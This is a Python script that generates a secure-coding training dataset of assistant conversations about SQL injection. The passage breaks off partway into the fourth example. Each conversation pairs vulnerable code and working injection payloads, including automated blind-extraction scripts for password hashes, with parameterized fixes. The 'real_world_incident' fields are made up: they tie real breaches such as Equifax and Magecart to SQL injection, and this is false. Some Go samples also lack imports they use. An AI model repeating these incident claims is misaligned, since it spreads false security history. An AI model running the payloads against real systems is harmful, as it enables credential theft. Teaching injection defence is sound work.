#!/usr/bin/env python3
"""
Batch 010: SQL Injection Advanced Techniques
Generates 10 advanced SQL injection examples covering sophisticated attack vectors
"""

import json
from pathlib import Path
from datetime import date


def create_base_metadata(language, example_num, technique):
    """Create metadata for SQL injection advanced example."""
    return {
        "lang": language,
        "category": "injection",
        "subcategory": "sql_injection",
        "technique": technique,
        "owasp_2021": "A03:2021-Injection",
        "cwe": "CWE-89",
        "severity": "CRITICAL",
        "complexity": "advanced",
        "created": str(date.today()),
        "validated": False
    }


def example_001_union_based():
    """Python - UNION-based SQL injection."""

    example_id = "sql-injection-000021"
    metadata = create_base_metadata("python", 1, "union_based_injection")

    context = {
        "real_world_incident": "2019 Magecart attacks using UNION-based SQLi",
        "impact": "Data exfiltration from 380+ e-commerce sites",
        "attack_vector": "UNION SELECT to extract database contents",
        "business_impact": "Millions of payment cards stolen"
    }

    human_turn_1 = """I'm building a product search. Is this query safe?"""

    assistant_turn_1 = """No! This is vulnerable to UNION-based SQL injection:

**VULNERABLE CODE**:

```python
import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search_products():
    query = request.args.get('q', '')

    # DANGER: String concatenation
    sql = f"SELECT id, name, price FROM products WHERE name LIKE '%{query}%'"

    conn = sqlite3.connect('store.db')
    cursor = conn.cursor()
    cursor.execute(sql)
    results = cursor.fetchall()

    return {'products': results}
```

**Attack Payload**:
```sql
' UNION SELECT username, password, email FROM users--

-- Full injected query becomes:
SELECT id, name, price FROM products WHERE name LIKE '%'
UNION SELECT username, password, email FROM users--%'

-- Returns all user credentials alongside product results
```

**Advanced Attack** (extracting table names):
```sql
' UNION SELECT 1,name,sql FROM sqlite_master WHERE type='table'--
```

**Why It Works**:
1. **Column count matching**: UNION requires same number of columns (3)
2. **Data type compatibility**: Strings work in all three columns
3. **Comment injection**: `--` comments out rest of query
4. **Information disclosure**: Attacker extracts any table data"""

    human_turn_2 = """How do I prevent UNION-based injection attacks?"""

    assistant_turn_2 = """Use **parameterized queries** with proper result handling:

**SECURE VERSION**:

```python
import sqlite3
from flask import Flask, request, abort

app = Flask(__name__)

@app.route('/search')
def search_products():
    query = request.args.get('q', '').strip()

    # Input validation
    if len(query) < 2:
        abort(400, "Search query too short")
    if len(query) > 100:
        abort(400, "Search query too long")

    # Parameterized query - UNION injection impossible
    sql = "SELECT id, name, price FROM products WHERE name LIKE ?"

    conn = sqlite3.connect('store.db')
    cursor = conn.cursor()

    # Safe parameter binding
    cursor.execute(sql, (f'%{query}%',))

    results = cursor.fetchall()

    # Return only expected schema
    products = [
        {'id': row[0], 'name': row[1], 'price': row[2]}
        for row in results
    ]

    return {'products': products}
```

**Key Security Controls**:
1. **Parameterized query**: `?` placeholder prevents SQL injection
2. **Input validation**: Length checks prevent DoS
3. **Schema enforcement**: Only return expected columns (id, name, price)
4. **No string concatenation**: Query structure is immutable"""

    human_turn_3 = """What if I need dynamic column selection or ORDER BY?"""

    assistant_turn_3 = """Use **allowlisting** for dynamic SQL elements:

```python
import sqlite3
from flask import Flask, request, abort

# Allowlist of safe columns for sorting
ALLOWED_SORT_COLUMNS = {
    'name': 'name',
    'price': 'price',
    'created_at': 'created_at'
}

ALLOWED_SORT_ORDERS = {'asc', 'desc'}

@app.route('/search')
def search_products():
    query = request.args.get('q', '').strip()
    sort_by = request.args.get('sort', 'name')
    order = request.args.get('order', 'asc').lower()

    # Validate against allowlist
    if sort_by not in ALLOWED_SORT_COLUMNS:
        abort(400, "Invalid sort column")

    if order not in ALLOWED_SORT_ORDERS:
        abort(400, "Invalid sort order")

    # Safe: column and order are from allowlist
    sql = f'''SELECT id, name, price
    FROM products
    WHERE name LIKE ?
    ORDER BY {ALLOWED_SORT_COLUMNS[sort_by]} {order}'''

    conn = sqlite3.connect('store.db')
    cursor = conn.cursor()
    cursor.execute(sql, (f'%{query}%',))

    results = cursor.fetchall()

    return {'products': [
        {'id': r[0], 'name': r[1], 'price': r[2]}
        for r in results
    ]}
```

**Why This Is Safe**:
- `sort_by` and `order` come from predefined allowlists
- No user input enters SQL directly
- Parameterized `?` for search term"""

    human_turn_4 = """What's the production best practice with an ORM?"""

    assistant_turn_4 = """Use **ORM query builders** with strict schema validation:

```python
from flask import Flask, request, abort
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import or_

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///store.db'
db = SQLAlchemy(app)

class Product(db.Model):
    __tablename__ = 'products'
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(200), nullable=False, index=True)
    price = db.Column(db.Numeric(10, 2), nullable=False)
    created_at = db.Column(db.DateTime, default=db.func.now())

# Allowlist for sorting
SORT_COLUMNS = {
    'name': Product.name,
    'price': Product.price,
    'created_at': Product.created_at
}

@app.route('/search')
def search_products():
    query = request.args.get('q', '').strip()
    sort_by = request.args.get('sort', 'name')
    order = request.args.get('order', 'asc').lower()
    page = request.args.get('page', 1, type=int)

    # Input validation
    if not 2 <= len(query) <= 100:
        abort(400, "Invalid query length")

    if sort_by not in SORT_COLUMNS:
        abort(400, "Invalid sort column")

    # ORM query builder - UNION injection impossible
    query_obj = Product.query.filter(
        Product.name.ilike(f'%{query}%')
    )

    # Safe sorting with allowlist
    sort_column = SORT_COLUMNS[sort_by]
    if order == 'desc':
        query_obj = query_obj.order_by(sort_column.desc())
    else:
        query_obj = query_obj.order_by(sort_column.asc())

    # Pagination prevents DoS
    pagination = query_obj.paginate(
        page=page, per_page=20, error_out=False
    )

    # Return only safe attributes
    return {
        'products': [
            {
                'id': p.id,
                'name': p.name,
                'price': float(p.price)
            }
            for p in pagination.items
        ],
        'total': pagination.total,
        'pages': pagination.pages
    }
```

**Production Security Features**:
1. **ORM query builder**: No raw SQL, immune to UNION injection
2. **Type-safe columns**: `Product.name` is validated by SQLAlchemy
3. **Pagination**: Prevents resource exhaustion
4. **Schema validation**: Only defined model attributes returned
5. **No reflection**: Can't access arbitrary tables"""

    return {
        "id": example_id,
        "metadata": metadata,
        "context": context,
        "conversations": [
            {"turn": 1, "from": "human", "value": human_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": human_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2},
            {"turn": 5, "from": "human", "value": human_turn_3},
            {"turn": 6, "from": "assistant", "value": assistant_turn_3},
            {"turn": 7, "from": "human", "value": human_turn_4},
            {"turn": 8, "from": "assistant", "value": assistant_turn_4}
        ],
        "validation": {
            "syntax_check": "pending",
            "security_review": "pending",
            "code_execution": "not_executed",
            "encoding_check": "pending",
            "duplication_check": "pending",
            "reviewed_by": "pending",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_002_error_based():
    """Java - Error-based SQL injection."""

    example_id = "sql-injection-000022"
    metadata = create_base_metadata("java", 2, "error_based_injection")

    context = {
        "real_world_incident": "2017 Equifax breach via Apache Struts SQLi",
        "impact": "147.9 million records exposed, $700M settlement",
        "attack_vector": "Error-based SQL injection revealing database structure",
        "business_impact": "Largest data breach in history at the time"
    }

    human_turn_1 = """Is displaying database errors to users a security risk?"""

    assistant_turn_1 = """Yes! Error messages leak critical database information:

**VULNERABLE CODE**:

```java
import java.sql.*;
import javax.servlet.http.*;

public class UserController extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) {
        String userId = request.getParameter("id");

        try {
            Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);

            // DANGER: String concatenation + error exposure
            String sql = "SELECT * FROM users WHERE id = " + userId;
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(sql);

            if (rs.next()) {
                response.getWriter().println("User: " + rs.getString("username"));
            }

        } catch (SQLException e) {
            // DANGER: Exposing database errors to user
            response.getWriter().println("Database error: " + e.getMessage());
        }
    }
}
```

**Attack Payload** (extracting database version):
```sql
1 AND 1=CAST((SELECT @@version) AS INT)--

-- Error message reveals:
-- "Conversion failed when converting the nvarchar value
--  'Microsoft SQL Server 2019 (RTM) - 15.0.2000.5' to data type int"
```

**Advanced Attack** (extracting table names):
```sql
1 AND 1=CAST((SELECT TOP 1 name FROM sys.tables) AS INT)--

-- Error reveals: "Conversion failed... value 'users' to data type int"
```

**Information Disclosed**:
1. Database type and version
2. Table names and structure
3. Column names
4. Data types
5. Server configuration"""

    human_turn_2 = """How do I fix this error-based injection vulnerability?"""

    assistant_turn_2 = """Use **prepared statements** and **generic error handling**:

**SECURE VERSION**:

```java
import java.sql.*;
import javax.servlet.http.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class UserController extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(UserController.class);

    protected void doGet(HttpServletRequest request, HttpServletResponse response) {
        String userId = request.getParameter("id");

        // Input validation
        if (userId == null || !userId.matches("^\\d+$")) {
            response.setStatus(400);
            response.getWriter().println("Invalid user ID");
            return;
        }

        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS)) {

            // Prepared statement prevents SQL injection
            String sql = "SELECT id, username, email FROM users WHERE id = ?";
            PreparedStatement pstmt = conn.prepareStatement(sql);
            pstmt.setInt(1, Integer.parseInt(userId));

            ResultSet rs = pstmt.executeQuery();

            if (rs.next()) {
                response.getWriter().println(
                    String.format("User: %s (%s)",
                        rs.getString("username"),
                        rs.getString("email"))
                );
            } else {
                response.getWriter().println("User not found");
            }

        } catch (SQLException e) {
            // Generic error message to user
            response.setStatus(500);
            response.getWriter().println("An error occurred processing your request");

            // Detailed logging for developers (not exposed to users)
            logger.error("Database error for user ID {}: {}", userId, e.getMessage(), e);
        }
    }
}
```

**Key Security Controls**:
1. **Prepared statement**: `?` placeholder prevents injection
2. **Input validation**: Regex ensures only digits
3. **Generic errors**: Users see "An error occurred", not database details
4. **Detailed logging**: Errors logged server-side for debugging
5. **Column allowlist**: Only select specific columns"""

    human_turn_3 = """What about exposing errors in development vs production?"""

    assistant_turn_3 = """Use **environment-aware error handling**:

```java
import java.sql.*;
import javax.servlet.http.*;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;

@Controller
public class UserController {

    @Value("${app.environment}")
    private String environment;

    @Value("${app.debug.sql-errors:false}")
    private boolean debugSqlErrors;

    public String getUser(HttpServletRequest request, HttpServletResponse response) {
        String userId = request.getParameter("id");

        // Input validation
        if (!userId.matches("^\\d{1,10}$")) {
            throw new IllegalArgumentException("Invalid user ID format");
        }

        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS)) {

            String sql = "SELECT id, username, email FROM users WHERE id = ?";
            PreparedStatement pstmt = conn.prepareStatement(sql);
            pstmt.setInt(1, Integer.parseInt(userId));

            ResultSet rs = pstmt.executeQuery();

            if (rs.next()) {
                return String.format("User: %s", rs.getString("username"));
            }
            return "User not found";

        } catch (SQLException e) {
            logger.error("Database error: {}", e.getMessage(), e);

            // Only show detailed errors in development
            if ("development".equals(environment) && debugSqlErrors) {
                response.setStatus(500);
                return "Database error: " + e.getMessage() +
                       "\n[DEBUG MODE - This detailed error is only shown in development]";
            }

            // Production: generic error
            response.setStatus(500);
            return "An error occurred. Please contact support.";
        }
    }
}
```

**Configuration** (`application.properties`):
```properties
# Development
app.environment=development
app.debug.sql-errors=true

# Production (MUST disable detailed errors)
app.environment=production
app.debug.sql-errors=false
```

**Why This Matters**:
- Development: Detailed errors help debugging
- Production: Generic errors prevent information disclosure
- Logs always capture full details regardless of environment"""

    human_turn_4 = """What's the best practice with Spring Data JPA?"""

    assistant_turn_4 = """Use **repository pattern** with **exception translation**:

```java
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.stereotype.Repository;

@Repository
public interface UserRepository extends JpaRepository<User, Long> {

    // Safe: Spring Data generates parameterized query
    Optional<User> findById(Long id);

    // Safe: Named parameters prevent injection
    @Query("SELECT u FROM User u WHERE u.username = :username")
    Optional<User> findByUsername(@Param("username") String username);
}

@RestController
@RequestMapping("/api/users")
public class UserController {

    @Autowired
    private UserRepository userRepository;

    @GetMapping("/{id}")
    public ResponseEntity<?> getUser(@PathVariable Long id) {
        try {
            // JPA handles parameterization automatically
            User user = userRepository.findById(id)
                .orElseThrow(() -> new EntityNotFoundException("User not found"));

            // Return DTO (not entity) to control exposed fields
            UserDTO dto = new UserDTO(
                user.getId(),
                user.getUsername(),
                user.getEmail()
            );

            return ResponseEntity.ok(dto);

        } catch (EntityNotFoundException e) {
            return ResponseEntity.status(404).body(
                Map.of("error", "User not found")
            );
        }
    }

    // Global exception handler
    @ExceptionHandler(DataAccessException.class)
    public ResponseEntity<?> handleDatabaseError(DataAccessException e) {
        logger.error("Database error: {}", e.getMessage(), e);

        // Generic error response
        return ResponseEntity.status(500).body(
            Map.of("error", "An internal error occurred")
        );
    }
}

// DTO to control exposed fields
public record UserDTO(Long id, String username, String email) {}
```

**Production Security**:
1. **Spring Data JPA**: Automatic parameterization
2. **Exception translation**: Database exceptions → generic HTTP errors
3. **DTO pattern**: Only expose safe fields
4. **Global error handler**: Consistent error responses
5. **No entity exposure**: DTOs prevent over-exposure"""

    return {
        "id": example_id,
        "metadata": metadata,
        "context": context,
        "conversations": [
            {"turn": 1, "from": "human", "value": human_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": human_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2},
            {"turn": 5, "from": "human", "value": human_turn_3},
            {"turn": 6, "from": "assistant", "value": assistant_turn_3},
            {"turn": 7, "from": "human", "value": human_turn_4},
            {"turn": 8, "from": "assistant", "value": assistant_turn_4}
        ],
        "validation": {
            "syntax_check": "pending",
            "security_review": "pending",
            "code_execution": "not_executed",
            "encoding_check": "pending",
            "duplication_check": "pending",
            "reviewed_by": "pending",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_003_time_based_blind():
    """PHP - Time-based blind SQL injection."""

    example_id = "sql-injection-000023"
    metadata = create_base_metadata("php", 3, "time_based_blind_injection")

    context = {
        "real_world_incident": "2016 Yahoo breach via blind SQL injection",
        "impact": "3 billion user accounts compromised",
        "attack_vector": "Time-based blind SQLi to extract data bit-by-bit",
        "business_impact": "$350M Verizon acquisition price reduction"
    }

    human_turn_1 = """My app doesn't return query results to users. Am I safe from SQL injection?"""

    assistant_turn_1 = """No! Time-based blind SQL injection doesn't need visible results:

**VULNERABLE CODE**:

```php
<?php
// Login endpoint - returns only boolean success/failure
function checkLogin($username, $password) {
    $conn = new mysqli($host, $user, $pass, $db);

    // DANGER: String concatenation
    $sql = "SELECT id FROM users WHERE username = '$username' AND password = MD5('$password')";

    $result = $conn->query($sql);

    // Only returns true/false - no data exposure
    if ($result && $result->num_rows > 0) {
        return json_encode(['success' => true]);
    }

    return json_encode(['success' => false]);
}

// Usage
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
echo checkLogin($username, $password);
?>
```

**Attack Payload** (extracting admin password character-by-character):
```sql
admin' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--

-- If first character is 'a', response takes 5+ seconds
-- If not 'a', response is instant
-- Repeat for each character position
```

**Automated Extraction**:
```python
import requests
import time

def extract_password():
    password = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"

    for position in range(1, 33):  # Assume 32-char hash
        for char in charset:
            payload = f"admin' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1)='{char}', SLEEP(3), 0)--"

            start = time.time()
            requests.post("http://example.com/login", data={
                'username': payload,
                'password': 'anything'
            })
            elapsed = time.time() - start

            if elapsed > 2.5:  # Detects 3-second sleep
                password += char
                print(f"Position {position}: {char} (password so far: {password})")
                break

    return password

# Extracts full password hash in ~30 minutes
```

**Why It Works**:
1. **Time delay observable**: SLEEP() creates measurable delay
2. **Boolean logic**: IF() tests each character
3. **Bit-by-bit extraction**: Iterate through all positions and characters
4. **No visible output needed**: Timing is the side channel"""

    human_turn_2 = """How do I prevent time-based blind SQL injection?"""

    assistant_turn_2 = """Use **prepared statements** and **constant-time responses**:

**SECURE VERSION**:

```php
<?php
function checkLogin($username, $password) {
    $conn = new mysqli($host, $user, $pass, $db);

    // Input validation
    if (strlen($username) > 50 || strlen($password) > 100) {
        return json_encode(['success' => false, 'error' => 'Invalid input']);
    }

    // Prepared statement prevents SQL injection
    $stmt = $conn->prepare("SELECT id, password_hash FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();

    $result = $stmt->get_result();

    if ($row = $result->fetch_assoc()) {
        // Use password_verify() not MD5 (MD5 is broken)
        if (password_verify($password, $row['password_hash'])) {
            // Successful login
            $_SESSION['user_id'] = $row['id'];
            return json_encode(['success' => true]);
        }
    }

    // IMPORTANT: Same response time whether user exists or not
    // Prevents user enumeration via timing attacks
    usleep(rand(100000, 300000)); // Random 100-300ms delay

    return json_encode(['success' => false, 'error' => 'Invalid credentials']);
}

// Usage with rate limiting
session_start();

// Rate limiting per IP
$ip = $_SERVER['REMOTE_ADDR'];
$attempts = $_SESSION["login_attempts_$ip"] ?? 0;

if ($attempts >= 5) {
    http_response_code(429);
    die(json_encode(['error' => 'Too many attempts. Try again in 15 minutes.']));
}

$_SESSION["login_attempts_$ip"] = $attempts + 1;

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

echo checkLogin($username, $password);
?>
```

**Key Security Controls**:
1. **Prepared statement**: `?` placeholder prevents injection
2. **Password hashing**: `password_verify()` with bcrypt
3. **Constant-time response**: Random delay prevents timing analysis
4. **Rate limiting**: 5 attempts per IP prevents brute force
5. **No user enumeration**: Same error for invalid user or password"""

    human_turn_3 = """What if I need to prevent timing attacks at the application level?"""

    assistant_turn_3 = """Implement **query timeout** and **execution time monitoring**:

```php
<?php
class SecureDatabase {
    private $conn;
    private const MAX_QUERY_TIME = 1; // 1 second max

    public function __construct($host, $user, $pass, $db) {
        $this->conn = new mysqli($host, $user, $pass, $db);

        // Set statement timeout at database level
        $this->conn->query("SET SESSION max_execution_time=1000"); // 1 second in MySQL
    }

    public function queryWithTimeout($sql, $params, $types) {
        $stmt = $this->conn->prepare($sql);

        if (!$stmt) {
            throw new Exception("Query preparation failed");
        }

        // Bind parameters
        $stmt->bind_param($types, ...$params);

        // Measure execution time
        $start = microtime(true);
        $result = $stmt->execute();
        $elapsed = microtime(true) - $start;

        // Log slow queries (potential attack indicator)
        if ($elapsed > self::MAX_QUERY_TIME) {
            error_log(sprintf(
                "SECURITY WARNING: Query exceeded timeout (%.2fs): %s with params: %s",
                $elapsed,
                $sql,
                json_encode($params)
            ));

            // Terminate long-running query
            $this->conn->kill($this->conn->thread_id);
            throw new Exception("Query timeout exceeded");
        }

        return $stmt->get_result();
    }
}

// Usage
$db = new SecureDatabase($host, $user, $pass, $dbname);

try {
    $result = $db->queryWithTimeout(
        "SELECT id, password_hash FROM users WHERE username = ?",
        [$username],
        "s"
    );

    // Process result...

} catch (Exception $e) {
    error_log("Database error: " . $e->getMessage());

    // Generic error to user
    http_response_code(500);
    echo json_encode(['error' => 'An error occurred']);
}
?>
```

**Why This Prevents Timing Attacks**:
- Queries exceeding 1 second are terminated
- SLEEP() attacks are blocked by timeout
- Slow queries logged for security monitoring
- Constant maximum response time prevents bit-by-bit extraction"""

    human_turn_4 = """What's the production best practice with Laravel ORM?"""

    assistant_turn_4 = """Use **Eloquent ORM** with **throttling middleware**:

```php
<?php
namespace App\\Http\\Controllers;

use App\\Models\\User;
use Illuminate\\Http\\Request;
use Illuminate\\Support\\Facades\\Hash;
use Illuminate\\Support\\Facades\\RateLimiter;
use Illuminate\\Validation\\ValidationException;

class AuthController extends Controller
{
    public function login(Request $request)
    {
        // Input validation
        $request->validate([
            'username' => 'required|string|max:50|alpha_num',
            'password' => 'required|string|min:8|max:100',
        ]);

        $username = $request->input('username');
        $password = $request->input('password');

        // Rate limiting: 5 attempts per 15 minutes per IP
        $key = 'login-attempts:' . $request->ip();

        if (RateLimiter::tooManyAttempts($key, 5)) {
            $seconds = RateLimiter::availableIn($key);

            throw ValidationException::withMessages([
                'username' => ["Too many login attempts. Try again in {$seconds} seconds."],
            ]);
        }

        // Eloquent prevents SQL injection automatically
        $user = User::where('username', $username)->first();

        // Constant-time comparison
        if ($user && Hash::check($password, $user->password)) {
            // Clear rate limiter on success
            RateLimiter::clear($key);

            // Create session
            auth()->login($user);

            return response()->json([
                'success' => true,
                'user' => [
                    'id' => $user->id,
                    'username' => $user->username
                ]
            ]);
        }

        // Increment rate limiter
        RateLimiter::hit($key, 900); // 15 minutes

        // Add random delay to prevent timing analysis
        usleep(random_int(200000, 400000)); // 200-400ms

        // Generic error message
        return response()->json([
            'success' => false,
            'error' => 'Invalid credentials'
        ], 401);
    }
}
```

**Route configuration** (`routes/api.php`):
```php
<?php
use Illuminate\\Support\\Facades\\Route;

Route::middleware(['throttle:login'])->group(function () {
    Route::post('/login', [AuthController::class, 'login']);
});
```

**Throttle configuration** (`app/Http/Kernel.php`):
```php
protected $middlewareGroups = [
    'api' => [
        'throttle:60,1', // 60 requests per minute by default
    ],
];

protected $routeMiddleware = [
    'throttle' => \\Illuminate\\Routing\\Middleware\\ThrottleRequests::class,
];
```

**Production Security**:
1. **Eloquent ORM**: Automatic parameterization prevents SQLi
2. **Hash::check()**: Constant-time password comparison
3. **Rate limiting**: 5 attempts per 15 minutes
4. **Random delay**: Prevents timing-based user enumeration
5. **Input validation**: Laravel validator ensures safe input types"""

    return {
        "id": example_id,
        "metadata": metadata,
        "context": context,
        "conversations": [
            {"turn": 1, "from": "human", "value": human_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": human_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2},
            {"turn": 5, "from": "human", "value": human_turn_3},
            {"turn": 6, "from": "assistant", "value": assistant_turn_3},
            {"turn": 7, "from": "human", "value": human_turn_4},
            {"turn": 8, "from": "assistant", "value": assistant_turn_4}
        ],
        "validation": {
            "syntax_check": "pending",
            "security_review": "pending",
            "code_execution": "not_executed",
            "encoding_check": "pending",
            "duplication_check": "pending",
            "reviewed_by": "pending",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_004_boolean_based_blind():
    """Go - Boolean-based blind SQL injection."""

    example_id = "sql-injection-000024"
    metadata = create_base_metadata("go", 4, "boolean_based_blind_injection")

    context = {
        "real_world_incident": "2020 Shopify Partner API SQL injection",
        "impact": "200+ merchant stores potentially compromised",
        "attack_vector": "Boolean-based blind SQLi via API parameters",
        "business_impact": "Emergency security patch deployed"
    }

    human_turn_1 = """My API only returns HTTP 200 or 404. Can it be SQL injected?"""

    assistant_turn_1 = """Yes! Boolean-based blind SQL injection uses true/false responses:

**VULNERABLE CODE**:

```go
package main

import (
    "database/sql"
    "fmt"
    "net/http"
    _ "github.com/go-sql-driver/mysql"
)

func checkProductHandler(w http.ResponseWriter, r *http.Request) {
    db, _ := sql.Open("mysql", "user:pass@/shop")
    defer db.Close()

    productID := r.URL.Query().Get("id")

    // DANGER: String concatenation
    query := fmt.Sprintf("SELECT id FROM products WHERE id = %s AND active = 1", productID)

    var id int
    err := db.QueryRow(query).Scan(&id)

    if err == sql.ErrNoRows {
        w.WriteHeader(http.StatusNotFound)
        fmt.Fprint(w, "Product not found")
        return
    }

    w.WriteHeader(http.StatusOK)
    fmt.Fprint(w, "Product exists")
}
```

**Attack Payload** (extracting database name character-by-character):
```sql
1 AND SUBSTRING(DATABASE(),1,1)='s'
-- Returns 200 if database name starts with 's', else 404

1 AND SUBSTRING(DATABASE(),1,1)='t'
-- Returns 404 (not 't')

1 AND SUBSTRING(DATABASE(),2,1)='h'
-- Returns 200 if second character is 'h'

-- Repeat to extract: "shop"
```

**Extracting admin password hash**:
```sql
1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>100
-- Returns 200 if first character ASCII > 100, else 404

-- Binary search through ASCII values to find exact character
-- Extract full password hash in ~300 requests
```

**Automated Exploitation**:
```python
import requests

def extract_database_name():
    name = ""
    for pos in range(1, 20):
        for char in "abcdefghijklmnopqrstuvwxyz0123456789_":
            url = f"http://example.com/check?id=1 AND SUBSTRING(DATABASE(),{pos},1)='{char}'"
            resp = requests.get(url)

            if resp.status_code == 200:
                name += char
                print(f"Position {pos}: {char} (database: {name})")
                break
        else:
            break  # No more characters
    return name
```

**Why It Works**:
- HTTP status codes leak true/false query results
- No visible data needed - just success/failure
- Can extract any data via yes/no questions"""

    human_turn_2 = """How do I prevent boolean-based blind SQL injection?"""

    assistant_turn_2 = """Use **parameterized queries** and **consistent responses**:

**SECURE VERSION**:

```go
package main

import (
    "database/sql"
    "fmt"
    "net/http"
    "strconv"
    "time"
    _ "github.com/go-sql-driver/mysql"
)

func checkProductHandler(w http.ResponseWriter, r *http.Request) {
    db, err := sql.Open("mysql", "user:pass@/shop")
    if err != nil {
        http.Error(w, "Database connection failed", 500)
        return
    }
    defer db.Close()

    productIDStr := r.URL.Query().Get("id")

    // Input validation: must be integer
    productID, err := strconv.Atoi(productIDStr)
    if err != nil || productID < 1 || productID > 999999999 {
        w.WriteHeader(http.StatusBadRequest)
        fmt.Fprint(w, "Invalid product ID")
        return
    }

    // Parameterized query prevents SQL injection
    query := "SELECT id, name FROM products WHERE id = ? AND active = 1"

    var id int
    var name string

    // Set query timeout to prevent DoS
    ctx, cancel := context.WithTimeout(r.Context(), 2*time.Second)
    defer cancel()

    err = db.QueryRowContext(ctx, query, productID).Scan(&id, &name)

    if err == sql.ErrNoRows {
        w.WriteHeader(http.StatusNotFound)
        fmt.Fprint(w, "Product not found")
        return
    }

    if err != nil {
        // Log error server-side
        log.Printf("Database error for product %d: %v", productID, err)

        // Generic error to client
        http.Error(w, "An error occurred", 500)
        return
    }

    // Success response
    w.WriteHeader(http.StatusOK)
    fmt.Fprintf(w, `{"id": %d, "name": "%s"}`, id, name)
}
```

**Key Security Controls**:
1. **Parameterized query**: `?` placeholder prevents injection
2. **Input validation**: `strconv.Atoi()` ensures integer type
3. **Query timeout**: 2-second limit prevents slow queries
4. **Generic errors**: No database details exposed to client
5. **Logging**: Errors logged server-side for debugging"""

    human_turn_3 = """What if I need to add timing protection against boolean attacks?"""

    assistant_turn_3 = """Implement **constant-time responses** with **rate limiting**:

```go
package main

import (
    "context"
    "database/sql"
    "encoding/json"
    "math/rand"
    "net/http"
    "strconv"
    "sync"
    "time"

    "golang.org/x/time/rate"
)

// Rate limiter per IP
var (
    limiters = make(map[string]*rate.Limiter)
    mu       sync.Mutex
)

func getRateLimiter(ip string) *rate.Limiter {
    mu.Lock()
    defer mu.Unlock()

    limiter, exists := limiters[ip]
    if !exists {
        // 10 requests per second per IP
        limiter = rate.NewLimiter(10, 20)
        limiters[ip] = limiter
    }
    return limiter
}

func checkProductHandler(w http.ResponseWriter, r *http.Request) {
    // Rate limiting
    ip := r.RemoteAddr
    limiter := getRateLimiter(ip)

    if !limiter.Allow() {
        http.Error(w, "Rate limit exceeded", 429)
        return
    }

    db, _ := sql.Open("mysql", "user:pass@/shop")
    defer db.Close()

    productIDStr := r.URL.Query().Get("id")
    productID, err := strconv.Atoi(productIDStr)

    if err != nil || productID < 1 {
        http.Error(w, "Invalid product ID", 400)
        return
    }

    // Start timer for constant-time response
    startTime := time.Now()
    minResponseTime := 100 * time.Millisecond

    // Parameterized query
    query := "SELECT id, name FROM products WHERE id = ? AND active = 1"

    ctx, cancel := context.WithTimeout(r.Context(), 1*time.Second)
    defer cancel()

    var id int
    var name string
    err = db.QueryRowContext(ctx, query, productID).Scan(&id, &name)

    // Calculate remaining time to reach minimum response time
    elapsed := time.Since(startTime)
    if elapsed < minResponseTime {
        time.Sleep(minResponseTime - elapsed)
    }

    // Add random jitter (50-150ms) to prevent timing analysis
    jitter := time.Duration(rand.Intn(100)+50) * time.Millisecond
    time.Sleep(jitter)

    if err == sql.ErrNoRows {
        w.WriteHeader(http.StatusNotFound)
        json.NewEncoder(w).Encode(map[string]string{
            "error": "Product not found",
        })
        return
    }

    if err != nil {
        log.Printf("Database error: %v", err)
        http.Error(w, "An error occurred", 500)
        return
    }

    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(map[string]interface{}{
        "id":   id,
        "name": name,
    })
}
```

**Timing Protection**:
- Minimum 100ms response time
- Random 50-150ms jitter
- Makes timing analysis impractical
- Rate limiting prevents brute force"""

    human_turn_4 = """What's the production pattern with GORM?"""

    assistant_turn_4 = """Use **GORM** with **middleware and monitoring**:

```go
package main

import (
    "context"
    "errors"
    "net/http"
    "strconv"
    "time"

    "github.com/gin-gonic/gin"
    "golang.org/x/time/rate"
    "gorm.io/driver/mysql"
    "gorm.io/gorm"
    "gorm.io/gorm/logger"
)

// Product model
type Product struct {
    ID        uint      `gorm:"primaryKey" json:"id"`
    Name      string    `gorm:"size:200;not null" json:"name"`
    Active    bool      `gorm:"default:true" json:"active"`
    CreatedAt time.Time `json:"created_at"`
}

// Rate limiting middleware
func RateLimitMiddleware() gin.HandlerFunc {
    limiters := make(map[string]*rate.Limiter)

    return func(c *gin.Context) {
        ip := c.ClientIP()

        if limiters[ip] == nil {
            limiters[ip] = rate.NewLimiter(10, 20) // 10 req/sec
        }

        if !limiters[ip].Allow() {
            c.JSON(429, gin.H{"error": "Rate limit exceeded"})
            c.Abort()
            return
        }

        c.Next()
    }
}

// Timing protection middleware
func ConstantTimeMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        startTime := time.Now()
        minDuration := 100 * time.Millisecond

        c.Next()

        elapsed := time.Since(startTime)
        if elapsed < minDuration {
            time.Sleep(minDuration - elapsed)
        }
    }
}

func main() {
    // GORM with logging and connection pooling
